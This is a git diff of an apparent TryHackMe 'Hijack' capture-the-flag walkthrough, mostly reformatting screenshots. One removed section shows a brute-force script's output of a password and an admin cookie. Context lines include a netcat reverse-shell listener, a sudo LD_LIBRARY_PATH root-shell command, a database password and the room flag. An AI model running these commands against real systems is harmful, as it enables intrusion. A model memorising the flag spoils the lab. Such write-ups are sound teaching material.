@@ -172,7 +172,9 @@ ftp> exit
 
 The file contained multiple passwords, which looked potentially useful for further enumeration and authentication attempts.
 
-<img width="401" height="199" alt="image" src="https://github.com/user-attachments/assets/fee27f94-abb8-49a9-996d-1285742e9a0c" />
+<div align="center">
+	<img width="401" height="199" alt="image" src="https://github.com/user-attachments/assets/fee27f94-abb8-49a9-996d-1285742e9a0c" />
+</div>
 
 ## Web Enumeration
 
@@ -180,19 +182,27 @@ After collecting the FTP password list, I moved toward the web application runni
 
 The homepage looked fairly simple at first glance.
 
-<img width="717" height="201" alt="image" src="https://github.com/user-attachments/assets/eaa5bc0c-8b49-450d-ad2e-f6edc2b1f111" />
+<div align="center">
+	<img width="717" height="201" alt="image" src="https://github.com/user-attachments/assets/eaa5bc0c-8b49-450d-ad2e-f6edc2b1f111" />
+</div>
 
 I created a normal account and logged into the application.
 
-<img width="393" height="171" alt="image" src="https://github.com/user-attachments/assets/8028bf1d-957c-4b70-af1f-f0125ef2dc18" />
+<div align="center">
+	<img width="393" height="171" alt="image" src="https://github.com/user-attachments/assets/8028bf1d-957c-4b70-af1f-f0125ef2dc18" />
+</div>
 
 After authentication, the dashboard looked mostly the same, but this time an additional Admin tab appeared in the navigation bar. When I clicked on it, the application returned an access denied message.
 
-<img width="696" height="121" alt="image" src="https://github.com/user-attachments/assets/f0fab9a3-b7ed-4899-ad03-e0dacb1e245a" />
+<div align="center">
+	<img width="696" height="121" alt="image" src="https://github.com/user-attachments/assets/f0fab9a3-b7ed-4899-ad03-e0dacb1e245a" />
+</div>
 
 That immediately made me curious about how the application handled authorization. I opened Burp Suite and intercepted the request while accessing the admin panel.
 
-<img width="828" height="801" alt="image" src="https://github.com/user-attachments/assets/0e169787-61a0-464e-8810-31801ddc4018" />
+<div align="center">
+	<img width="828" height="801" alt="image" src="https://github.com/user-attachments/assets/0e169787-61a0-464e-8810-31801ddc4018" />
+</div>
 
 While reviewing the captured request, the session cookie looked unusual.
 ```
@@ -201,7 +211,9 @@ Cookie: PHPSESSID=VGVzdDowZTc1MTcxNDFmYjUzZjIxZWU0MzliMzU1YjVhMWQwYQ%3D%3D
 
 The structure looked encoded rather than randomly generated, so I copied the value into [CyberChef](https://cyberchef.org) for analysis.
 
-<img width="1127" height="610" alt="image" src="https://github.com/user-attachments/assets/eb8a823f-e53b-431e-b7e9-2697aab659f5" />
+<div align="center">
+	<img width="1127" height="610" alt="image" src="https://github.com/user-attachments/assets/eb8a823f-e53b-431e-b7e9-2697aab659f5" />
+</div>
 
 After decoding it, the format looked like:
 ```
@@ -300,47 +312,23 @@ After a few attempts, a valid session was finally discovered.
 ```
 Using the generated cookie, I was able to access the admin panel successfully.
 
-
-i used chatgpt to crate a script of my desiger 
-```
-```
-save the script 
-```
-nano bruteforce.py
-```
-how to use it 
-```
-death@esther:~$ nano bruteforce.py
-death@esther:~$ python3 bruteforce.py 
-[+] Enter Target IP: 10.49.153.158
-[+] Enter Wordlist Path: .passwords_list.txt
-
-[+] Loaded 150 passwords
-[+] Target: http://10.49.153.158/administration.php
-```
-it ask for ip of website gave set
-and it ask for wordlist path in my case i save script in home directory and my passwd list s there so i just gave it 
-its tart brute force as u enter details
-
-boom we got detais
-```
-[+] Valid Session Found
-[+] Password : uDh3jCQsdcuLhjVkAy5x
-[+] Cookie   : PHPSESSID=YWRtaW46ZDY1NzNlZDczOWFlN2ZkZmIzY2VkMTk3ZDk0ODIwYTU=
-death@esther:~$ 
-```
-<img width="784" height="179" alt="image" src="https://github.com/user-attachments/assets/10aa672c-458d-4b26-bd5e-b608b02bb804" />
-
+<div align="center">
+	<img width="784" height="179" alt="image" src="https://github.com/user-attachments/assets/10aa672c-458d-4b26-bd5e-b608b02bb804" />
+</div>
 
 ## Initial Access
 
 With the valid admin session cookie generated earlier, I went back to the application and intercepted the request to the administration panel using Burp Suite.
 
-<img width="754" height="784" alt="image" src="https://github.com/user-attachments/assets/9ca1eb76-451c-4ad1-8597-3635fd333d49" />
+<div align="center">
+	<img width="754" height="784" alt="image" src="https://github.com/user-attachments/assets/9ca1eb76-451c-4ad1-8597-3635fd333d49" />
+</div>
 
 I replaced the existing PHPSESSID value with the newly generated admin cookie.
 
-<img width="1429" height="451" alt="image" src="https://github.com/user-attachments/assets/da352ba1-08ec-4e1a-9f0f-d3a0e79df363" />
+<div align="center">
+	<img width="1429" height="451" alt="image" src="https://github.com/user-attachments/assets/da352ba1-08ec-4e1a-9f0f-d3a0e79df363" />
+</div>
 
 After forwarding the modified request, the admin panel loaded successfully.
 
@@ -348,7 +336,10 @@ The page turned out to be an online service status checker. It accepted a servic
 
 To understand how the feature behaved, I tested it using `ssh`.
 
-<img width="1191" height="498" alt="image" src="https://github.com/user-attachments/assets/0fae9e75-f86e-44fb-aae8-1aea510089d1" />
+<div align="center">
+	<img width="1191" height="498" alt="image" src="https://github.com/user-attachments/assets/0fae9e75-f86e-44fb-aae8-1aea510089d1" />
+</div>
+
 The application returned the service status correctly. While testing the functionality, I noticed that every request required the admin session cookie, so I kept replacing the cookie value inside Burp before forwarding requests.
 
 After spending some time interacting with the feature, I realized the input might be vulnerable to command injection. The backend appeared to execute shell commands directly using the provided service name.
@@ -369,7 +360,9 @@ nc -lnvp 1234
 ```
 I replaced `<IP>` with my VPN IP address and submitted the payload through the service checker.
 
-<img width="1275" height="510" alt="image" src="https://github.com/user-attachments/assets/ce00c706-8a2c-4d56-b0fe-06ebc58913a2" />
+<div align="center">
+	<img width="1275" height="510" alt="image" src="https://github.com/user-attachments/assets/ce00c706-8a2c-4d56-b0fe-06ebc58913a2" />
+</div>
 
 A few seconds later, the reverse shell connected back successfully.
 
@@ -410,7 +403,9 @@ $password = "N3v3rG0nn4G1v3Y0uUp";
 $dbname = "hijack";
 ```
 
-<img width="733" height="372" alt="image" src="https://github.com/user-attachments/assets/3a148004-9146-44cc-a543-58ee05b61367" />
+<div align="center">
+	<img width="733" height="372" alt="image" src="https://github.com/user-attachments/assets/3a148004-9146-44cc-a543-58ee05b61367" />
+</div>
 
 # Lateral Movement
 
@@ -522,7 +517,9 @@ sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2 -f /etc/apache2/apache2.conf -d /etc
 
 The exploit worked successfully and spawned a root shell.
 
-<img width="1303" height="164" alt="image" src="https://github.com/user-attachments/assets/efb9896e-09d1-4750-98e2-5e58616472ce" />
+<div align="center">
+	<img width="1303" height="164" alt="image" src="https://github.com/user-attachments/assets/efb9896e-09d1-4750-98e2-5e58616472ce" />
+</div>
 
 # Root Access
 
@@ -547,7 +544,9 @@ THM{b91ea3e8285157eaf173d88d0a73ed5a}
 
 Hijack was a fun machine focused on misconfigurations, session hijacking, command injection, and privilege escalation through `LD_LIBRARY_PATH` abuse. Every step connected nicely and made the enumeration process feel realistic and practical.
 
-<img width="829" height="385" alt="image" src="https://github.com/user-attachments/assets/b3fb5c0e-6f42-43f6-ba47-8aa01b3cdad4" />
+<div align="center">
+	<img width="829" height="385" alt="image" src="https://github.com/user-attachments/assets/b3fb5c0e-6f42-43f6-ba47-8aa01b3cdad4" />
+</div>
 
 Thanks for reading this walkthrough. I hope it helped you understand the room better.
 
